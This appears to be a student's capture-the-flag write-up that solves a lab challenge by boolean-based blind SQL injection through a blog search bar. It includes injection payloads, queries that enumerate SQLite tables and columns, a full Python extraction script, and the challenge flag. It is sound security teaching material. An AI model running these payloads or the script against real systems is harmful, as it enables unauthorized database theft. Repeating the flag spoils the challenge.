---

---

---
## Description

The admin was in a hurry but he managed to fix the login and update profile problems! He just lacked the time to fix the search bar injection... but to prevent it from being exploited, the `admin` just stopped showing the blog posts.

Can you still exploit it?

`http://ssof2526.challenges.cwte.me:25262`

---

This challenge is the same as the others, but this time we can't see any blog posts.
![[Page.png]]

Trying different things revealed a difference in server response based on the search term:
* Searching for `a` returned **"Found 4 articles"**.
* Searching for `zzzz` returned **"Found 0 articles"**.

![[A.png]]

![[ZZZ.png]]

This difference is basically a boolean oracle. Even though the app does not display the data, we can differentiate the result of a SQL query based on whether the article count is greater than 0.

I confirmed the injection point by forcing a true condition:
`a' OR 1=1 --`
![[4.png]]
**Result:** Found 4 articles

Making a false condition:
`a' OR 1=2 --`
**Result:** Found 0 articles

Since `UNION`-based injection was not possible, I used boolean-based blind SQLi to map the database structure.

Because SQLite stores table metadata in `sqlite_master`, I iterated through the table names using `SUBSTR()`.

**Payload Logic:**
```sql
zzzz' OR (SELECT SUBSTR(tbl_name, 1, 1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0) = 'a' --
```

**Discovered Tables:**

1. `user`

2. `blog_post`

3. `super_s_sof_secrets`

I targeted the `super_s_sof_secrets` table. To find the column names, I queried the `pragma_table_info()` virtual table.

**Payload Logic:**

```sql
zzzz' OR (SELECT SUBSTR(name, 1, 1) FROM pragma_table_info('super_s_sof_secrets') LIMIT 1 OFFSET 1) = 'a' --
```

**Discovered Column:** `secret`

With the target identified as `super_s_sof_secrets.secret`, I wrote a Python script to automate the character-by-character extraction.

```python
import requests
import string
import sys

TARGET_URL = "http://ssof2526.challenges.cwte.me:25262/"
PARAM_NAME = "search"

TARGET_TABLE = "super_s_sof_secrets"
TARGET_COLUMN = "secret"

OFFSETS_TO_CHECK = [0, 1, 2]

CHARSET = string.ascii_letters + string.digits + "{}_-@.!?,:; '\""

def exploit_victory():
    print(f"Trying: {TARGET_URL}")
    print(f"Target: {TARGET_TABLE}.{TARGET_COLUMN}")
    
    for offset in OFFSETS_TO_CHECK:
        print(f"\nDumping Row #{offset+1} (Offset {offset})...")
        extracted_data = ""
        
        for position in range(1, 100):
            found_char = False
            for char in CHARSET:
                if char == "'": sql_char = "''"
                else: sql_char = char
                
                sqli_logic = f"(SELECT SUBSTR({TARGET_COLUMN}, {position}, 1) FROM {TARGET_TABLE} LIMIT 1 OFFSET {offset}) = '{sql_char}'"
                
                payload = f"zzzz' OR {sqli_logic} -- "
                
                try:
                    r = requests.get(TARGET_URL, params={PARAM_NAME: payload}, timeout=5)
                except:
                    continue

                if "Found 0 articles" not in r.text and "Found" in r.text:
                    extracted_data += char
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    found_char = True
                    break
            
            if not found_char:
                break
        
        if len(extracted_data) > 0:
            print(f"\nFOUND: {extracted_data}")
            if "SSoF" in extracted_data:
                print(f"\n Found the flag: {extracted_data}")
                return
        else:
            print("Empty")

if __name__ == "__main__":
    exploit_victory()
```

1. **Iterators:** The script loops through potential rows (`OFFSET 0, 1, 2`) and character positions (`1` to `100`).

2. **Payload Construction:**
 - `zzzz`: Ensures the base search returns 0 results.   
 - `OR`: Injects the boolean check.  
 - `LIMIT 1 OFFSET X`: Isolates a single row. 
 - `SUBSTR(..., pos, 1)`: Isolates a single character.   
3. **Oracle Check:**
 - If the response contains `"Found"` (implied > 0), the character match is **True**.
 - If the response contains `"Found 0"`, the character match is **False**.

## FLAG
```flag
SSof{I_am_just_partially_blind_since_I_can_gEt_yoUr_datA_using_Boolean_Injections}
```

---
## Conclusion

This challenge showed that preventing direct output isn't enough if the server response varies based on the query. By exploiting the boolean difference between "Found 4" and "Found 0" articles, I was able to enumerate the database and extract the flag from the hidden `super_s_sof_secrets` table character by character.
